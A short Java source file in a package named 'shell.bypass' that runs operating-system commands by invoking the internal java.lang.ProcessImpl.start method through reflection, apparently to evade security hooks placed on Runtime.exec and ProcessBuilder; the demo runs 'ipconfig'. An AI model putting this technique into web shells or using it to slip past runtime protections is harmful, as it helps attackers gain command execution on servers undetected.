package shell.bypass;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.Map;

public class test {
    public static void main(String[] args) {
        try {
            bypass(new String[]{"ipconfig"});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void bypass(String[] cmd) throws Exception{
        Map<String,String> envblock=null;
        String path=null;
        ProcessBuilder.Redirect[] stdHandles=null;
        boolean redirectErrorStream=true;

        Class C = Class.forName("java.lang.ProcessImpl");
        Method start = C.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        start.setAccessible(true);
        Process e =  (Process) start.invoke(null, cmd, envblock, path, stdHandles, redirectErrorStream);

        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(e.getInputStream()));
        String line;
        while ((line=bufferedReader.readLine())!=null){
            System.out.println(line);
        }
        bufferedReader.close();
    }
}
